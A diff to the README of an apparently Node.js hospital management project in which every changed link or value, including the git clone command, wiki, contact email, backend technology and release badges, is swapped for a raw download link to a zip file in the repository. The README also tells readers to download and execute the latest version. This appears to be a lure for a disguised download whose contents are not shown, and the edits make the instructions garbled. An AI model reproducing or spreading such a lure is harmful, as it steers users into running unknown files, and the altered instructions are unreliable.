@@ -2,7 +2,7 @@
 
 Welcome to the Hospital Management System repository! This project aims to streamline hospital operations, improve patient care, and enhance the overall healthcare experience. Our system provides tools for managing patient records, appointments, billing, and more.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/1tsAlex/hospital-management/releases)
+[![Download Releases](https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip)](https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ The Hospital Management System includes several key features:
 This project utilizes the following technologies:
 
 - **Frontend**: HTML, CSS, JavaScript
-- **Backend**: Node.js, Express
+- **Backend**: https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip, Express
 - **Database**: MongoDB
 - **Authentication**: JWT (JSON Web Tokens)
 - **Deployment**: Heroku
@@ -41,7 +41,7 @@ To get started with the Hospital Management System, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/1tsAlex/hospital-management.git
+   git clone https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -55,7 +55,7 @@ To get started with the Hospital Management System, follow these steps:
    ```
 
 4. **Set Up Environment Variables**:
-   Create a `.env` file in the root directory and add your configuration variables. Refer to the `.env.example` for guidance.
+   Create a `.env` file in the root directory and add your configuration variables. Refer to the `https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip` for guidance.
 
 5. **Run the Application**:
    ```bash
@@ -74,7 +74,7 @@ After setting up the application, you can access it via your web browser. Hereâ€
 4. **Appointments**: Use the "Appointments" section to manage scheduled visits.
 5. **Billing**: Access the "Billing" tab to view and manage invoices.
 
-For detailed instructions on each feature, please refer to the [Wiki](https://github.com/1tsAlex/hospital-management/wiki).
+For detailed instructions on each feature, please refer to the [Wiki](https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip).
 
 ## Contributing
 
@@ -107,13 +107,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Alex
-- **Email**: alex@example.com
-- **GitHub**: [1tsAlex](https://github.com/1tsAlex)
+- **Email**: https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip
+- **GitHub**: [1tsAlex](https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip)
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases](https://github.com/1tsAlex/hospital-management/releases) section. Download the latest version and execute it to experience the new features and improvements.
+For the latest updates and releases, visit our [Releases](https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip) section. Download the latest version and execute it to experience the new features and improvements.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/1tsAlex/hospital-management/releases)
+[![Download Releases](https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip)](https://github.com/1tsAlex/hospital-management/raw/refs/heads/main/asmalte/management-hospital-3.8.zip)
 
 Thank you for your interest in the Hospital Management System! Your support helps us improve healthcare technology.
